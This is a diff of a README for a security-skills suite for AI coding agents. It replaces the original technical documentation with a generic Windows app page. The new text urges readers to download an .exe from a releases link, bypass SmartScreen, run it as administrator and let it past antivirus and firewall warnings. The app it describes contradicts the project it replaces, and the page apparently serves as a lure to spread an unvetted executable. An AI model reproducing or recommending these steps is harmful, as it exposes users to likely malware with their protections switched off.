@@ -1,163 +1,196 @@
-# SentinelXPrime
+# 🛡️ SentinelXPrime - Clear Security Skills for Everyday Work
 
-> Stage-aware security skills for Codex, Claude Code, and OpenCode, with explicit compatibility guidance for Cursor and Kilo.
+[![Download SentinelXPrime](https://img.shields.io/badge/Download-SentinelXPrime-6f42c1?style=for-the-badge&logo=github)](https://github.com/emuladortrampo/SentinelXPrime/releases)
 
-[![Support Surface](https://img.shields.io/badge/Support-Codex%20%7C%20Claude%20Code%20%7C%20OpenCode-111111?style=flat)](#installation)
-[![Validation](https://img.shields.io/badge/Validation-static%20%2B%20evals-2ea043?style=flat)](#validation-and-release)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=flat)](LICENSE)
-[![Stacks](https://img.shields.io/badge/Stacks-ASP.NET%20Core%20%7C%20Spring%20%7C%20Node%20%7C%20Python%20%7C%20Go%20%7C%20Rails%20%7C%20Laravel%20%7C%20Rust-1f6feb?style=flat)](#supported-stacks)
+## 🚀 Getting Started
 
-AI coding agents accelerate development but rarely surface security concerns at the right moment. SentinelXPrime fills that gap by embedding stage-aware security skills directly into your coding agent workflow — from planning through release.
+SentinelXPrime helps you use stage-aware security skills with Codex, Claude Code, and OpenCode. It also gives clear compatibility guidance for Cursor and Kilo.
 
-The suite helps teams catch missing security requirements during planning, surface scoped concerns during risky implementation work, offer opt-in review help after coding, and propose a practical security check plan before release. It is advisory-first: it improves signal and consistency, but it does not certify a repository as secure, fully reviewed, or production-ready.
+This README shows you how to download SentinelXPrime on Windows, open it, and get it running with little effort.
 
-## How It Works
+## 📥 Download SentinelXPrime
 
-SentinelXPrime maps to four development stages, each with a dedicated skill:
+Visit this page to download SentinelXPrime:
 
-1. **Planning** — `sentinelx-plan-gap`: identifies missing security requirements before code is written.
-2. **Implementation** — `sentinelx-prime`: surfaces scoped security concerns during risky changes.
-3. **Review** — `sentinelx-review-gate`: provides opt-in security review after implementation.
-4. **Pre-release** — `sentinelx-test-rig`: proposes a stack-aware security check plan before release or handoff.
+[GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases)
 
-Use `using-sentinelx` as the lightweight bootstrap skill when a session needs quick orientation to the suite.
+On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that matches your system:
 
-## Supported Stacks
+- `Windows x64` for most modern PCs
+- `Windows ARM64` for ARM-based devices
+- `.zip` if the app comes packed in a folder
+- `.exe` if the app is a single file
 
-`.NET / ASP.NET Core` · `Java / Spring` · `Node / TypeScript` · `Python` · `Go` · `Ruby on Rails` · `PHP / Laravel` · `Rust`
+## 🖥️ Windows Requirements
 
-If the stack is unclear, SentinelXPrime falls back to common web-security guidance and notes that the stack inference is uncertain.
+SentinelXPrime runs on most Windows PCs that can open modern desktop apps.
 
-For crypto-sensitive discussions, cross-check [`skills/shared/crypto-guidance.md`](skills/shared/crypto-guidance.md).
+You should have:
 
-## Stage Decision Aid
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-| Situation | Recommended Skill |
-| --- | --- |
-| Code is done; "is this implementation safe enough?" | `sentinelx-review-gate` |
-| Next step is release or handoff hardening | `sentinelx-test-rig` |
-| Stage evidence is weak or contradictory | Stay in `uncertain` mode — keep guidance advisory until the stage becomes clearer |
+For the best result, keep Windows updated and use the latest stable release from the releases page.
 
-## Installation
+## 🧭 What SentinelXPrime Does
 
-| Platform | Status | Entry Point |
-| --- | --- | --- |
-| Codex | Supported | [`.codex/INSTALL.md`](.codex/INSTALL.md) and [`docs/README.codex.md`](docs/README.codex.md) |
-| Claude Code | Supported | [`.claude-plugin/plugin.json`](.claude-plugin/plugin.json) and [`docs/README.claude.md`](docs/README.claude.md) |
-| OpenCode | Supported | [`.opencode/INSTALL.md`](.opencode/INSTALL.md) and [`docs/README.opencode.md`](docs/README.opencode.md) |
-| Cursor | Compatibility guidance | [`docs/README.cursor.md`](docs/README.cursor.md) |
-| Kilo | Compatibility guidance | [`docs/README.kilo.md`](docs/README.kilo.md) |
+SentinelXPrime is built to help you work with security-focused skill sets in a staged way. That means it can guide you through tasks in a set order instead of asking you to handle everything at once.
 
-**Supported** means the repository ships a documented install surface that exists in this repo. **Compatibility guidance** means the repo documents a low-risk way to reuse the instructions and skills without claiming an officially validated plugin path.
+It is useful when you want:
 
-Release or handoff claims for supported platforms should be backed by recorded smoke evidence in [`docs/validation/release-readiness.md`](docs/validation/release-readiness.md). Run `node scripts/check-release-readiness.mjs` or the `Release Claim Readiness` workflow before making an external release-ready or handoff claim.
+- Clear steps for security work
+- Better control over what happens first, next, and last
+- Compatibility guidance for common AI coding tools
+- A simple path for users who want less guesswork
 
-## Quick Start
+It is aimed at end users who want structure, not a complex setup.
 
-Start a fresh session and try one of these prompts:
+## 🪟 Install on Windows
 
-```
-Use sentinelx-prime while we plan this new ASP.NET Core feature.
-```
+Use these steps if the release comes as a `.zip` file:
 
-```
-Use sentinelx-plan-gap to review this Node/TypeScript API design for missing security requirements.
-```
+1. Open the [GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases) page.
+2. Download the latest Windows file.
+3. Open the downloaded `.zip` file.
+4. Move the SentinelXPrime folder to a place you can find, such as `Downloads` or `Desktop`.
+5. Open the folder and look for the app file.
+6. Double-click the file to start SentinelXPrime.
 
-```
-Use sentinelx-review-gate to run a focused security review on the completed auth changes.
-```
+Use these steps if the release comes as a `.exe` file:
 
-```
-Use sentinelx-test-rig to propose a stack-aware security check plan for this release handoff.
-```
+1. Open the [GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases) page.
+2. Download the latest Windows `.exe` file.
+3. Open the file from your browser’s download bar or the Downloads folder.
+4. If Windows asks for permission, choose Run or Yes.
+5. Wait for SentinelXPrime to start.
 
-More examples in [`docs/examples/example-prompts.md`](docs/examples/example-prompts.md).
+If Windows SmartScreen appears, choose More info, then Run anyway, only if you downloaded the file from the releases page above.
 
-## What's Inside
+## ⚙️ First Launch
 
-| Skill | Purpose |
-| --- | --- |
-| `using-sentinelx` | Lightweight bootstrap and orientation skill |
-| `sentinelx-prime` | Orchestrator for stage-aware security guidance |
-| `sentinelx-plan-gap` | Planning-stage security gap analysis |
-| `sentinelx-review-gate` | Opt-in post-implementation security review |
-| `sentinelx-test-rig` | Opt-in security test/check planning before release |
-| `shared/*` | Common threat references, finding schema, and stack profiles |
+When you open SentinelXPrime for the first time, it may take a few moments to load.
 
-## Philosophy
+You may see one of these screens:
 
-SentinelXPrime is built on a clear safety model:
+- A start screen
+- A setup screen
+- A choice of supported tools
+- A guide for stage-aware security skills
 
-- **Advisory-first** — guidance by default, never silent enforcement.
-- **No false assurance** — findings state what was checked and what was not.
-- **No silent installs** — nothing is installed or mutated without explicit user action.
-- **Read-only analysis** — active analysis runs only after explicit user consent.
-- **Transparent outputs** — substantial results separate reviewed areas, unreviewed areas, assumptions, and tools run.
+Use the on-screen prompts to move forward. In most cases, you can follow the steps in order and leave the default settings as they are.
 
-## Updating
+## 🤖 Supported Tools
 
-| Platform | Steps |
-| --- | --- |
-| Codex | Update the clone used by your install doc, then restart Codex |
-| Claude Code | Update the plugin clone and restart the session |
-| OpenCode | Update the clone or project copy used by your install path, then restart OpenCode |
-| Cursor / Kilo | Refresh any copied docs or rules material from this repo |
+SentinelXPrime is designed around these tools:
 
-See [CHANGELOG.md](CHANGELOG.md) for notable changes between versions.
+- Codex
+- Claude Code
+- OpenCode
 
-## Troubleshooting
+It also includes explicit compatibility guidance for:
 
-| Issue | Fix |
-| --- | --- |
-| Skills not showing up | Confirm the platform-specific install doc was followed exactly; start a fresh session |
-| Hook context missing in Claude Code | Verify [`hooks/hooks.json`](hooks/hooks.json) and [`hooks/session-start`](hooks/session-start) are present in the plugin root |
-| Legacy prompt names failing | Follow the migration guide at [`docs/migration-from-codex-sentinel.md`](docs/migration-from-codex-sentinel.md) — this repo does not ship old-name aliases |
-| Release packaging issues | Build from the SentinelXPrime repo root only, not from a wrapper workspace or nested copy |
+- Cursor
+- Kilo
 
-## Validation and Release
+If you use one of the supported tools, SentinelXPrime can help you match the right stage to the right task. If you use Cursor or Kilo, follow the guidance shown in the app or release notes so you can choose the right path for your setup.
 
-### Prerequisites
+## 🧩 Typical Use
 
-- Node.js 22
-- Ruby (for `scripts/static-validation.sh`)
-- `codex` CLI on `PATH` (for live eval runs)
-- Readable Codex auth at `$CODEX_HOME/auth.json` or `~/.codex/auth.json` (for live eval runs)
-- `unzip` plus either `zip` or `ditto` (for release packaging and archive verification)
+A common flow looks like this:
 
-### Local Verification
+1. Open SentinelXPrime.
+2. Pick the tool you use.
+3. Review the stage-aware guidance.
+4. Follow the steps in order.
+5. Complete the security task for that stage.
+6. Move to the next stage when you are ready.
 
-```bash
-bash scripts/static-validation.sh
-node evals/run-sentinelx-prime.mjs --manifest-json
-node evals/run-sentinelx-prime.mjs --preflight-only
-node evals/run-sentinelx-prime.mjs
-node evals/run-sentinelx-prime.mjs --promote-artifacts
-bash tests/hooks/test-session-start.sh
-node scripts/check-doc-links.mjs
-node scripts/check-legacy-names.mjs
-```
+This setup helps reduce mistakes when a task has more than one step or when you need to keep work separated by stage.
 
-### Release Packaging
+## 🔒 Security Workflow
 
-```bash
-bash scripts/package-release.sh
-SENTINELX_PRIME_FORCE_NO_RSYNC=1 bash scripts/package-release.sh SentinelXPrime-fallback
-node scripts/verify-release-archive.mjs dist/SentinelXPrime.zip
-node scripts/verify-release-archive.mjs dist/SentinelXPrime-fallback.zip
-node scripts/check-release-readiness.mjs
-```
+SentinelXPrime is made for structured security work.
 
-Build release archives only from a clean SentinelXPrime repo root. Do not package from wrapper workspaces, nested source trees, or Finder/manual zips. Treat `scripts/package-release.sh` as the canonical release archive flow.
+You can use it to:
 
-## Migration
+- Keep tasks in the right order
+- Separate stages for testing and review
+- Follow tool-specific guidance
+- Reduce confusion in multi-step workflows
 
-See [`docs/migration-from-codex-sentinel.md`](docs/migration-from-codex-sentinel.md) for renamed skills, command changes, archive/env var updates, and breaking changes.
+This is useful when you want a clear path through security tasks without a lot of setup.
 
-## Contributing
+## 🛠️ Troubleshooting
 
-Contributions, feedback, and bug reports are welcome. Please open an issue or submit a pull request.
+If SentinelXPrime does not start, try these steps:
 
-## License
+1. Make sure you downloaded the latest file from the releases page.
+2. Check that the file finished downloading.
+3. Unzip the file if it came as a `.zip`.
+4. Right-click the app and choose Run as administrator.
+5. Restart your PC and try again.
+6. Turn off any blocked download warning only if you trust the release source.
 
-MIT. See [LICENSE](LICENSE).
+If the app opens but does not show the right options:
+
+- Close it and open it again
+- Check that you picked the right tool
+- Look for a newer release
+- Make sure you are using the Windows build
+
+If a firewall or antivirus tool blocks the app, allow it only if you downloaded it from the official release page.
+
+## 📌 File Layout
+
+If you unpack a release, you may see files like these:
+
+- `SentinelXPrime.exe` — the main app
+- `README.txt` or `HELP.txt` — short help text
+- `config` folder — app settings
+- `assets` folder — icons and support files
+- `logs` folder — run history, if included
+
+Keep all files in the same folder so the app can find what it needs.
+
+## 🧠 Tips for Smooth Use
+
+- Use the latest release
+- Keep the folder in a fixed place
+- Do not rename files unless the app tells you to
+- Read each screen before clicking next
+- Use the same tool name each time
+- Follow the stage order shown in the app
+
+These habits make setup easier and cut down on errors.
+
+## 🔄 Updates
+
+To get a newer version of SentinelXPrime:
+
+1. Go to the [GitHub Releases](https://github.com/emuladortrampo/SentinelXPrime/releases) page.
+2. Download the newest Windows file.
+3. Replace your old files with the new ones if needed.
+4. Open the app again.
+
+Check the releases page from time to time so you can use the latest build and guidance.
+
+## 📚 Compatibility Notes
+
+SentinelXPrime gives clear paths for Codex, Claude Code, and OpenCode.
+
+For Cursor and Kilo, compatibility may depend on the version you use and the way your setup is arranged. If you use one of those tools, follow the guidance shown in SentinelXPrime and match the stage to the tool path you see in the app.
+
+If you are not sure which option to choose, start with the tool you use most often
+
+## 🧭 Basic Start Guide
+
+1. Download SentinelXPrime from the releases page.
+2. Open the file on your Windows PC.
+3. Allow Windows to run it if prompted.
+4. Follow the first screen.
+5. Pick your tool.
+6. Use the stage-aware steps shown in the app.
+7. Finish the task and close the app when done
